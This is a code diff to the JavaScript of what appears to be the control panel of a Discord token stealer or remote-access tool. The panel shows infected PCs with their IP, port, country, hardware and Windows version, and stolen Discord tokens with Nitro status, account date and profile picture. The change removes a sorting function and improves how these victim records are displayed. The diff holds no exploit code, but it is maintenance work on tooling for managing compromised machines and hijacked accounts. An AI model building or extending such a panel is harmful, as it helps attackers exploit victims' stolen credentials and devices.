@@ -60,34 +60,6 @@
     if (tokEl)    tokEl.textContent    = allTokens.length;
   }
 
-  /* ─────────────────── connection sorting ─────────────────── */
-  function sortConnections(field) {
-    const currentDir = connSortField === field ? connSortDir : 'asc';
-    const newDir = currentDir === 'asc' ? 'desc' : 'asc';
-    connSortField = field;
-    connSortDir = newDir;
-    
-    filtConns.sort((a, b) => {
-      let aVal = a[field] || '';
-      let bVal = b[field] || '';
-      
-      if (field === 'status') {
-        aVal = a.status === 'online' ? 1 : 0;
-        bVal = b.status === 'online' ? 1 : 0;
-      } else {
-        aVal = String(aVal).toLowerCase();
-        bVal = String(bVal).toLowerCase();
-      }
-      
-      if (aVal < bVal) return newDir === 'asc' ? -1 : 1;
-      if (aVal > bVal) return newDir === 'asc' ? 1 : -1;
-      return 0;
-    });
-    
-    connPage = 1;
-    renderConns();
-  }
-
   /* ─────────────────── sub-tab switching ─────────────────── */
   function wireSubTabs() {
     document.querySelectorAll('[data-ctab]').forEach(btn => {
@@ -156,7 +128,10 @@
         : `<span style="color:var(--txt-faint);">No</span>`;
       return `<tr class="ctn-row">
         <td class="ctn-pcname">${pcCell}</td>
-        <td class="ctn-ip">${esc(c.ip)}</td>
+        <td class="ctn-ip">
+          ${esc(c.ip)}
+          ${c.port ? `<br><span style="color:#8892b0;font-size:11px;">Port: ${esc(c.port)}</span>` : ''}
+        </td>
         <td>${flag(c.country)}${esc(c.country)}</td>
         <td class="ctn-hw">${esc(shortHw(c.hardware))}</td>
         <td class="ctn-win">${esc(shortWin(c.windows))}</td>
@@ -243,8 +218,20 @@
       const nitroCell = t.hasNitro === 'Yes'
         ? `<span style="color:#7dffa0;font-weight:600;">✓ Yes</span>`
         : `<span style="color:var(--txt-faint);">No</span>`;
+      
+      // Discord profile picture as circle before name
+      const pfpHtml = t.discordPfp 
+        ? `<img src="${esc(t.discordPfp)}" class="tok-pfp" alt="" />`
+        : `<div class="tok-pfp tok-pfp-empty"></div>`;
+      const nameDisplay = t.discordName || t.pcName || '—';
+      
       return `<tr class="ctn-row">
-        <td class="ctn-pcname">${esc(t.discordName || t.pcName || '—')}</td>
+        <td class="ctn-pcname">
+          <div style="display:flex;align-items:center;gap:10px;">
+            ${pfpHtml}
+            <span>${esc(nameDisplay)}</span>
+          </div>
+        </td>
         <td>${nitroCell}</td>
         <td style="font-size:12px;">${esc(t.acctDate || '—')}</td>
         <td>
